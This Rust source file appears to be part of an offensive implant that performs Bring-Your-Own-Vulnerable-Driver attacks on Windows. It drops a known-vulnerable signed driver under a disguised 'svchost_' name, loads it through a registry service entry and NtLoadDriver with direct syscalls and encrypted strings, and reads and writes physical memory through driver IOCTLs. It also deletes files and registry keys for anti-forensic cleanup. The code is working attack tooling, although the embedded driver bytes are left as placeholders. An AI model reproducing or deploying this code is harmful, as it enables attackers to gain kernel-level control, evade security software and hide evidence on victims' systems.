//! Vulnerable driver deployment for BYOVD operations.
//!
//! Handles:
//! 1. Scanning for already-loaded vulnerable drivers via NtQuerySystemInformation
//! 2. Dropping embedded driver resources to disk (obfuscated filename, XOR-decrypted)
//! 3. Loading the driver via NtLoadDriver (creates registry service entry)
//! 4. Post-load cleanup: file deletion, obtaining device handles
//!
//! All NT API calls go through `nt_syscall::syscall!`.
//! All strings through `string_crypt`.

use super::driver_db::{self, DriverMapping, VulnerableDriver};
use anyhow::{bail, Context, Result};
use std::sync::Mutex;
use once_cell::sync::Lazy;

/// XOR key placeholder for driver resource decryption.
/// In production, this is derived from the agent's HKDF session key.
/// The actual derivation uses `CryptoSession::derive_key_bytes()` with
/// the session salt and info string "orchestra-driver-key".
const DRIVER_XOR_KEY_LEN: usize = 32;

/// State of a currently-loaded vulnerable driver.
#[derive(Debug)]
pub struct DeployedDriver {
    /// The driver database entry that was loaded.
    pub driver: &'static VulnerableDriver,
    /// Handle to the driver device (if opened).
    pub device_handle: Option<usize>,
    /// Name of the registry service entry (for cleanup).
    pub service_name: String,
    /// Whether the driver was already loaded on the system (vs. freshly loaded).
    pub was_preloaded: bool,
}

/// Global state: the currently deployed driver (at most one active).
static DEPLOYED: Lazy<Mutex<Option<DeployedDriver>>> = Lazy::new(|| Mutex::new(None));

// ── NT structures for NtQuerySystemInformation (SystemModuleInformation) ─

#[repr(C)]
#[derive(Clone, Copy)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

unsafe impl Send for UnicodeString {}
unsafe impl Sync for UnicodeString {}

#[repr(C)]
struct SystemModuleInformationEntry {
    section: *mut u8,
    mapped_base: *mut u8,
    image_base: *mut u8,
    image_size: u32,
    flags: u32,
    load_order_index: u16,
    init_order_index: u16,
    load_count: u16,
    name_offset: u8,
    full_path_name: [u8; 256],
}

unsafe impl Send for SystemModuleInformationEntry {}

#[repr(C)]
struct SystemModuleInformation {
    count: u32,
    modules: [SystemModuleInformationEntry; 1],
}

// SystemModuleInformation class
const SYSTEM_MODULE_INFORMATION: u32 = 11;

// Service registry types
const SERVICE_KERNEL_DRIVER: u32 = 1;
const SERVICE_DEMAND_START: u32 = 3;
const SERVICE_ERROR_IGNORE: u32 = 0;

/// Scan for already-loaded vulnerable drivers on the system.
///
/// Uses `NtQuerySystemInformation(SystemModuleInformation)` to enumerate
/// loaded kernel modules and checks against the driver database.
///
/// # Returns
/// - `Ok(Some(driver))` if a known vulnerable driver is already loaded
/// - `Ok(None)` if no known driver is found
/// - `Err` on query failure
pub fn scan_for_loaded_driver(preferred: &[String]) -> Result<Option<&'static VulnerableDriver>> {
    // Build the preference filter (empty = try all).
    let filter: Vec<&str> = if preferred.is_empty() {
        driver_db::all_driver_names()
    } else {
        preferred.iter().map(|s| s.as_str()).collect()
    };

    // Query system module information.
    let mut buf_size: u32 = 0;
    let base_addr: usize = 0;

    // First call to get required buffer size.
    unsafe {
        let status = nt_syscall::syscall!(
            "NtQuerySystemInformation",
            SYSTEM_MODULE_INFORMATION,
            base_addr as *mut u8,
            0,
            &mut buf_size as *mut u32
        );
        // STATUS_INFO_LENGTH_MISMATCH (0xC0000004) is expected.
        let _ = status;
    }

    if buf_size == 0 {
        bail!("NtQuerySystemInformation returned zero buffer size");
    }

    // Allocate buffer and query again.
    let mut buffer: Vec<u8> = vec![0u8; buf_size as usize + 4096];
    let mut return_length: u32 = 0;

    let status = unsafe {
        nt_syscall::syscall!(
            "NtQuerySystemInformation",
            SYSTEM_MODULE_INFORMATION,
            buffer.as_mut_ptr(),
            buffer.len(),
            &mut return_length as *mut u32
        )
    };

    if status != 0 {
        bail!(
            "NtQuerySystemInformation(SystemModuleInformation) failed: 0x{:08X}",
            status
        );
    }

    // Parse the returned module list.
    let info = &buffer[0] as *const u8 as *const SystemModuleInformation;
    let count = unsafe { (*info).count } as usize;

    for i in 0..count {
        let entry = unsafe {
            let base = &(*info).modules as *const SystemModuleInformationEntry;
            &*base.add(i)
        };

        // Extract the module name from the fixed-size path buffer.
        let name_offset = entry.name_offset as usize;
        let name_bytes: Vec<u8> = entry.full_path_name[name_offset..]
            .iter()
            .take_while(|&&b| b != 0)
            .copied()
            .collect();

        if let Ok(module_name) = String::from_utf8(name_bytes) {
            // Check if this module matches any of our known drivers.
            for driver_name in &filter {
                if module_name.eq_ignore_ascii_case(driver_name) {
                    if let Some(driver) = driver_db::find_driver(driver_name) {
                        log::info!(
                            "Found already-loaded vulnerable driver: {}",
                            driver.name
                        );
                        return Ok(Some(driver));
                    }
                }
            }
        }
    }

    Ok(None)
}

/// XOR-decrypt an embedded driver resource.
///
/// The driver bytes are XOR'd with a key derived from the HKDF session key.
/// In the actual implementation, the key comes from `CryptoSession`.
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut out = data.to_vec();
    for (i, byte) in out.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
    out
}

/// Derive the driver decryption key from the HKDF session key.
///
/// Uses HKDF-SHA256 with info "orchestra-driver-key" and the session salt.
/// Falls back to a deterministic key derived from the raw session key bytes
/// if HKDF is not available.
fn derive_driver_key(session_key: &[u8]) -> [u8; DRIVER_XOR_KEY_LEN] {
    use hkdf::Hkdf;
    use sha2::Sha256;

    let hk = Hkdf::<Sha256>::new(None, session_key);
    let mut key = [0u8; DRIVER_XOR_KEY_LEN];
    hk.expand(b"orchestra-driver-key", &mut key)
        .expect("HKDF expand must succeed for driver key derivation");
    key
}

/// Drop an embedded driver to disk, load it, and clean up.
///
/// Steps:
/// 1. XOR-decrypt the embedded driver bytes
/// 2. Write to a temp file with obfuscated name
/// 3. Create a registry service entry
/// 4. Load the driver via NtLoadDriver
/// 5. Delete the file from disk (driver stays in kernel memory)
/// 6. Open a handle to the device
pub fn deploy_embedded_driver(
    driver: &'static VulnerableDriver,
    session_key: &[u8],
) -> Result<DeployedDriver> {
    // For now, we simulate the embedded resource with placeholder bytes.
    // In production, this would be `include_bytes!` with actual driver binaries.
    let encrypted_bytes = get_embedded_driver_bytes(driver);
    if encrypted_bytes.is_empty() {
        bail!(
            "No embedded resource for driver {}. Only DBUtil_2_3, rtcore64, and gdrv are embedded.",
            driver.name
        );
    }

    // Derive the decryption key from the session key.
    let key = derive_driver_key(session_key);
    let decrypted = xor_decrypt(&encrypted_bytes, &key);

    // Generate obfuscated temp filename.
    let service_name = format!(
        "{}{}",
        string_crypt::enc_str!("svchost_"),
        crate::common_short_id()
    );
    let temp_path = format!(
        "C:\\Windows\\Temp\\{}.sys",
        service_name
    );

    // Write the driver to disk.
    write_driver_to_disk(&temp_path, &decrypted)
        .context("failed to write driver to disk")?;

    // Load the driver via NtLoadDriver.
    let result = load_driver_via_registry(&service_name, &temp_path);

    // Always try to delete the file from disk after loading.
    let _ = delete_file_from_disk(&temp_path);

    // Check if loading succeeded.
    let device_handle = result?;

    // Open device handle for IOCTL communication.
    let handle = open_driver_device(driver, &service_name);

    let deployed = DeployedDriver {
        driver,
        device_handle: handle.ok(),
        service_name,
        was_preloaded: false,
    };

    // Store in global state.
    {
        let mut guard = DEPLOYED.lock().unwrap();
        *guard = Some(DeployedDriver {
            driver: deployed.driver,
            device_handle: deployed.device_handle,
            service_name: deployed.service_name.clone(),
            was_preloaded: false,
        });
    }

    log::info!(
        "Deployed vulnerable driver {} (device handle: {:?})",
        driver.name,
        deployed.device_handle
    );

    Ok(deployed)
}

/// Get the embedded (XOR-encrypted) bytes for a driver.
///
/// In production, the top 3 drivers are embedded via `include_bytes!` with
/// XOR obfuscation applied at build time.  For now, returns empty to indicate
/// the driver is not embedded (the agent will try scanning for pre-loaded ones).
fn get_embedded_driver_bytes(_driver: &VulnerableDriver) -> Vec<u8> {
    // Placeholder — actual implementation would use:
    //   static DBUTIL_BYTES: &[u8] = include_bytes!("../../resources/DBUtil_2_3.sys.xor");
    //   static RTCORE_BYTES: &[u8] = include_bytes!("../../resources/rtcore64.sys.xor");
    //   static GDRV_BYTES: &[u8] = include_bytes!("../../resources/gdrv.sys.xor");
    //
    // Each is XOR'd at build time with a compile-time key. The runtime
    // decryption uses the HKDF-derived key above.
    Vec::new()
}

/// Write driver bytes to a file on disk using NtCreateFile.
fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
    use std::mem::MaybeUninit;

    let mut handle: usize = 0;
    let mut io_status_block = MaybeUninit::<[u64; 4]>::uninit();

    // Build NT path.
    let nt_path = if path.starts_with('\\') {
        path.to_string()
    } else {
        format!("\\??\\{}", path)
    };

    // Convert to wide string.
    let mut wide_path: Vec<u16> = nt_path.encode_utf16().collect();
    wide_path.push(0);

    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: usize,
        object_name: *mut u16,
        attributes: u32,
        security_descriptor: usize,
        security_qos: usize,
    }

    #[repr(C)]
    struct UnicodeStringNt {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UnicodeStringNt {
        length: (wide_path.len() as u16 - 1) * 2,
        maximum_length: wide_path.len() as u16 * 2,
        buffer: wide_path.as_mut_ptr(),
    };

    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: &mut uni_name as *mut _ as *mut u16,
        attributes: 0x40, // OBJ_CASE_INSENSITIVE
        security_descriptor: 0,
        security_qos: 0,
    };

    // FILE_GENERIC_WRITE = 0x40000000, FILE_OVERWRITE_IF = 2, FILE_SYNCHRONOUS_IO_NONALERT = 0x20
    let status = unsafe {
        nt_syscall::syscall!(
            "NtCreateFile",
            &mut handle as *mut usize,
            0x40000000u32, // GENERIC_WRITE
            &mut oa as *mut _ as *mut u8,
            io_status_block.as_mut_ptr() as *mut _,
            0, // AllocationSize
            0x80, // FILE_ATTRIBUTE_NORMAL
            0, // ShareAccess
            2u32, // FILE_OVERWRITE_IF
            0x20u32, // FILE_SYNCHRONOUS_IO_NONALERT
            0, // EaBuffer
            0  // EaLength
        )
    };

    if status != 0 {
        bail!("NtCreateFile for driver path failed: 0x{:08X}", status);
    }

    // Write the data.
    let mut bytes_written: u32 = 0;
    let status = unsafe {
        nt_syscall::syscall!(
            "NtWriteFile",
            handle,
            0, // Event
            0, // ApcRoutine
            0, // ApcContext
            io_status_block.as_mut_ptr() as *mut _,
            data.as_ptr() as *mut _,
            data.len() as u32,
            0, // ByteOffset
            0  // Key
        )
    };

    // Close the file handle.
    let _ = unsafe {
        nt_syscall::syscall!("NtClose", handle)
    };

    if status != 0 {
        bail!("NtWriteFile for driver failed: 0x{:08X}", status);
    }

    Ok(())
}

/// Load a driver via NtLoadDriver by creating a registry service entry.
///
/// Creates `HKLM\SYSTEM\CurrentControlSet\Services\<name>` with the
/// necessary values (ImagePath, Type, Start, ErrorControl), then calls
/// NtLoadDriver.
fn load_driver_via_registry(service_name: &str, image_path: &str) -> Result<()> {
    // Registry path: \Registry\Machine\System\CurrentControlSet\Services\<name>
    let reg_path = format!(
        "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{}",
        service_name
    );

    // Create the registry key via NtCreateKey.
    let mut key_handle: usize = 0;
    let nt_path_wide: Vec<u16> = reg_path.encode_utf16().chain(std::iter::once(0)).collect();

    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: usize,
        object_name: *mut u16,
        attributes: u32,
        security_descriptor: usize,
        security_qos: usize,
    }

    #[repr(C)]
    struct UnicodeStringNt {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UnicodeStringNt {
        length: (nt_path_wide.len() as u16 - 1) * 2,
        maximum_length: nt_path_wide.len() as u16 * 2,
        buffer: nt_path_wide.as_ptr() as *mut u16,
    };

    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: &mut uni_name as *mut _ as *mut u16,
        attributes: 0x40, // OBJ_CASE_INSENSITIVE
        security_descriptor: 0,
        security_qos: 0,
    };

    let mut disp: u32 = 0;

    let status = unsafe {
        nt_syscall::syscall!(
            "NtCreateKey",
            &mut key_handle as *mut usize,
            0x000F003F, // KEY_ALL_ACCESS
            &mut oa as *mut _ as *mut u8,
            0, // TitleIndex
            0, // Class
            1, // CreateOptions = REG_OPTION_VOLATILE
            &mut disp as *mut u32
        )
    };

    if status != 0 {
        bail!("NtCreateKey for service entry failed: 0x{:08X}", status);
    }

    // Set registry values: ImagePath, Type, Start, ErrorControl.
    set_registry_dword(key_handle, "Type", SERVICE_KERNEL_DRIVER)?;
    set_registry_dword(key_handle, "Start", SERVICE_DEMAND_START)?;
    set_registry_dword(key_handle, "ErrorControl", SERVICE_ERROR_IGNORE)?;
    set_registry_string(key_handle, "ImagePath", &format!("\\??\\{}", image_path))?;

    // Load the driver.
    let status = unsafe {
        nt_syscall::syscall!(
            "NtLoadDriver",
            &mut uni_name as *mut _ as *mut u8
        )
    };

    // Close the registry key.
    let _ = unsafe { nt_syscall::syscall!("NtClose", key_handle) };

    if status != 0 {
        // Clean up the registry key on failure.
        delete_registry_key(&reg_path);
        bail!("NtLoadDriver failed: 0x{:08X}", status);
    }

    Ok(())
}

/// Set a DWORD registry value via NtSetValueKey.
fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result<()> {
    let name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();

    #[repr(C)]
    struct UnicodeStringNt {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UnicodeStringNt {
        length: (name_wide.len() as u16 - 1) * 2,
        maximum_length: name_wide.len() as u16 * 2,
        buffer: name_wide.as_ptr() as *mut u16,
    };

    let status = unsafe {
        nt_syscall::syscall!(
            "NtSetValueKey",
            key_handle,
            &mut uni_name as *mut _ as *mut u8,
            0, // TitleIndex
            4u32, // REG_DWORD
            &value as *const u32 as *mut u8,
            4u32 // DataSize
        )
    };

    if status != 0 {
        bail!(
            "NtSetValueKey({}) failed: 0x{:08X}",
            value_name,
            status
        );
    }

    Ok(())
}

/// Set a string registry value via NtSetValueKey.
fn set_registry_string(key_handle: usize, value_name: &str, value: &str) -> Result<()> {
    let name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut value_wide: Vec<u16> = value.encode_utf16().collect();
    let data_size = value_wide.len() as u32 * 2 + 2; // Include null terminator

    #[repr(C)]
    struct UnicodeStringNt {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UnicodeStringNt {
        length: (name_wide.len() as u16 - 1) * 2,
        maximum_length: name_wide.len() as u16 * 2,
        buffer: name_wide.as_ptr() as *mut u16,
    };

    let status = unsafe {
        nt_syscall::syscall!(
            "NtSetValueKey",
            key_handle,
            &mut uni_name as *mut _ as *mut u8,
            0,
            1u32, // REG_SZ
            value_wide.as_mut_ptr() as *mut u8,
            data_size
        )
    };

    if status != 0 {
        bail!(
            "NtSetValueKey({}) failed: 0x{:08X}",
            value_name,
            status
        );
    }

    Ok(())
}

/// Delete a registry key via NtDeleteKey.
fn delete_registry_key(path: &str) {
    let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();

    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: usize,
        object_name: *mut u16,
        attributes: u32,
        security_descriptor: usize,
        security_qos: usize,
    }

    #[repr(C)]
    struct UnicodeStringNt {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UnicodeStringNt {
        length: (wide.len() as u16 - 1) * 2,
        maximum_length: wide.len() as u16 * 2,
        buffer: wide.as_ptr() as *mut u16,
    };

    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: &mut uni_name as *mut _ as *mut u16,
        attributes: 0x40,
        security_descriptor: 0,
        security_qos: 0,
    };

    let mut key_handle: usize = 0;

    unsafe {
        let status = nt_syscall::syscall!(
            "NtOpenKey",
            &mut key_handle as *mut usize,
            0x00020019, // KEY_WRITE | DELETE
            &mut oa as *mut _ as *mut u8
        );
        if status == 0 {
            let _ = nt_syscall::syscall!("NtDeleteKey", key_handle);
            let _ = nt_syscall::syscall!("NtClose", key_handle);
        }
    }
}

/// Delete a file from disk using NtDeleteFile.
fn delete_file_from_disk(path: &str) -> Result<()> {
    let nt_path = if path.starts_with('\\') {
        path.to_string()
    } else {
        format!("\\??\\{}", path)
    };

    let mut wide_path: Vec<u16> = nt_path.encode_utf16().collect();
    wide_path.push(0);

    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: usize,
        object_name: *mut u16,
        attributes: u32,
        security_descriptor: usize,
        security_qos: usize,
    }

    #[repr(C)]
    struct UnicodeStringNt {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UnicodeStringNt {
        length: (wide_path.len() as u16 - 1) * 2,
        maximum_length: wide_path.len() as u16 * 2,
        buffer: wide_path.as_ptr() as *mut u16,
    };

    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: &mut uni_name as *mut _ as *mut u16,
        attributes: 0x40,
        security_descriptor: 0,
        security_qos: 0,
    };

    let status = unsafe {
        nt_syscall::syscall!(
            "NtDeleteFile",
            &mut oa as *mut _ as *mut u8
        )
    };

    if status != 0 {
        // Non-fatal: the driver is already loaded in kernel memory.
        log::warn!("Failed to delete driver file from disk: 0x{:08X}", status);
    }

    Ok(())
}

/// Open a handle to the driver device for IOCTL communication.
fn open_driver_device(driver: &VulnerableDriver, service_name: &str) -> Result<usize> {
    // Build the device path. Most vulnerable drivers create a device with
    // a name derived from the driver or service name.
    let device_path = format!("\\Device\\{}", service_name);
    let mut wide_path: Vec<u16> = device_path.encode_utf16().collect();
    wide_path.push(0);

    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: usize,
        object_name: *mut u16,
        attributes: u32,
        security_descriptor: usize,
        security_qos: usize,
    }

    #[repr(C)]
    struct UnicodeStringNt {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    let mut uni_name = UnicodeStringNt {
        length: (wide_path.len() as u16 - 1) * 2,
        maximum_length: wide_path.len() as u16 * 2,
        buffer: wide_path.as_ptr() as *mut u16,
    };

    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: &mut uni_name as *mut _ as *mut u16,
        attributes: 0x40,
        security_descriptor: 0,
        security_qos: 0,
    };

    let mut handle: usize = 0;
    let mut io_status_block = [0u64; 4];

    let status = unsafe {
        nt_syscall::syscall!(
            "NtOpenFile",
            &mut handle as *mut usize,
            0x00100000 | 0x00020000, // SYNCHRONIZE | FILE_READ_DATA
            &mut oa as *mut _ as *mut u8,
            io_status_block.as_mut_ptr() as *mut _,
            0x20, // FILE_SYNCHRONOUS_IO_NONALERT
            0     // ShareAccess
        )
    };

    if status != 0 {
        bail!(
            "NtOpenFile for driver device failed: 0x{:08X}",
            status
        );
    }

    Ok(handle)
}

/// Read physical memory through the deployed driver.
///
/// # Safety
/// Caller must ensure `physical_address` is a valid physical memory address.
pub unsafe fn read_physical_memory(
    driver: &VulnerableDriver,
    device_handle: usize,
    physical_address: u64,
    buffer: &mut [u8],
) -> Result<()> {
    match driver.mapping_type {
        DriverMapping::PhysicalMemory => {
            // Build the IOCTL input buffer: [physical_address: u64, length: u32]
            let mut input = [0u8; 16];
            input[0..8].copy_from_slice(&physical_address.to_le_bytes());
            input[8..12].copy_from_slice(&(buffer.len() as u32).to_le_bytes());

            let mut bytes_returned: u32 = 0;

            // Use NtDeviceIoControlFile for the IOCTL.
            let status = nt_syscall::syscall!(
                "NtDeviceIoControlFile",
                device_handle,
                0, // Event
                0, // ApcRoutine
                0, // ApcContext
                &mut bytes_returned as *mut u32,
                driver.read_ioctl,
                input.as_ptr() as *mut u8,
                input.len() as u32,
                buffer.as_mut_ptr() as *mut u8,
                buffer.len() as u32
            );

            if status != 0 {
                bail!(
                    "Physical memory read failed at 0x{:016X}: 0x{:08X}",
                    physical_address,
                    status
                );
            }
            Ok(())
        }
        DriverMapping::MmioMapping | DriverMapping::PortIo => {
            bail!(
                "Driver mapping type {:?} not yet supported for physical memory read",
                driver.mapping_type
            );
        }
    }
}

/// Write physical memory through the deployed driver.
///
/// # Safety
/// Caller must ensure `physical_address` is a valid physical memory address
/// and the data will not corrupt critical kernel structures.
pub unsafe fn write_physical_memory(
    driver: &VulnerableDriver,
    device_handle: usize,
    physical_address: u64,
    data: &[u8],
) -> Result<()> {
    match driver.mapping_type {
        DriverMapping::PhysicalMemory => {
            // Build the IOCTL input buffer: [physical_address: u64, length: u32, data...]
            let mut input = vec![0u8; 12 + data.len()];
            input[0..8].copy_from_slice(&physical_address.to_le_bytes());
            input[8..12].copy_from_slice(&(data.len() as u32).to_le_bytes());
            input[12..].copy_from_slice(data);

            let mut bytes_returned: u32 = 0;

            let status = nt_syscall::syscall!(
                "NtDeviceIoControlFile",
                device_handle,
                0,
                0,
                0,
                &mut bytes_returned as *mut u32,
                driver.write_ioctl,
                input.as_ptr() as *mut u8,
                input.len() as u32,
                0, // OutputBuffer
                0  // OutputLength
            );

            if status != 0 {
                bail!(
                    "Physical memory write failed at 0x{:016X}: 0x{:08X}",
                    physical_address,
                    status
                );
            }
            Ok(())
        }
        DriverMapping::MmioMapping | DriverMapping::PortIo => {
            bail!(
                "Driver mapping type {:?} not yet supported for physical memory write",
                driver.mapping_type
            );
        }
    }
}

/// Clean up the deployed driver: delete registry entry, close handles, unlink.
///
/// # Safety
/// Must be called before agent exit to avoid leaving traces.
pub unsafe fn cleanup_driver() -> Result<()> {
    let mut guard = DEPLOYED.lock().unwrap();
    if let Some(deployed) = guard.take() {
        // Close device handle.
        if let Some(handle) = deployed.device_handle {
            let _ = nt_syscall::syscall!("NtClose", handle);
        }

        // Delete the registry service entry.
        let reg_path = format!(
            "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{}",
            deployed.service_name
        );
        delete_registry_key(&reg_path);

        // Note: We do NOT unload the driver. Unloading would call the driver's
        // DriverUnload routine which could trigger callbacks. The driver remains
        // loaded but with all registry traces removed. The driver should be
        // unlinked from PsLoadedModuleList by the overwrite module for full
        // anti-forensic cleanup.

        log::info!("Cleaned up driver deployment for {}", deployed.driver.name);
    }
    Ok(())
}

/// Get a reference to the currently deployed driver state, if any.
pub fn get_deployed_driver() -> Option<DeployedDriver> {
    let guard = DEPLOYED.lock().unwrap();
    guard.as_ref().map(|d| DeployedDriver {
        driver: d.driver,
        device_handle: d.device_handle,
        service_name: d.service_name.clone(),
        was_preloaded: d.was_preloaded,
    })
}

/// Main deployment orchestrator: try pre-loaded drivers, then embedded.
///
/// # Arguments
/// * `preferred` - Optional list of driver names to try (empty = try all)
/// * `session_key` - HKDF session key for driver resource decryption
pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver> {
    // Step 1: Try to find an already-loaded vulnerable driver.
    if let Some(driver) = scan_for_loaded_driver(preferred)? {
        // Driver is already loaded — just need a device handle.
        let service_name = crate::common_short_id();
        let handle = open_driver_device(driver, &service_name).ok();

        let deployed = DeployedDriver {
            driver,
            device_handle: handle,
            service_name,
            was_preloaded: true,
        };

        {
            let mut guard = DEPLOYED.lock().unwrap();
            *guard = Some(DeployedDriver {
                driver: deployed.driver,
                device_handle: deployed.device_handle,
                service_name: deployed.service_name.clone(),
                was_preloaded: true,
            });
        }

        log::info!(
            "Using pre-loaded vulnerable driver: {}",
            driver.name
        );

        return Ok(deployed);
    }

    // Step 2: Try embedded drivers.
    let embedded = driver_db::embedded_drivers();
    for driver in embedded {
        // Skip if not in preferred list (when specified).
        if !preferred.is_empty() {
            let name_match = preferred
                .iter()
                .any(|p| p.eq_ignore_ascii_case(driver.name));
            if !name_match {
                continue;
            }
        }

        match deploy_embedded_driver(driver, session_key) {
            Ok(deployed) => return Ok(deployed),
            Err(e) => {
                log::warn!(
                    "Failed to deploy embedded driver {}: {}",
                    driver.name,
                    e
                );
                continue;
            }
        }
    }

    bail!("No vulnerable driver could be deployed (tried {} embedded, scanned for pre-loaded)", embedded.len());
}
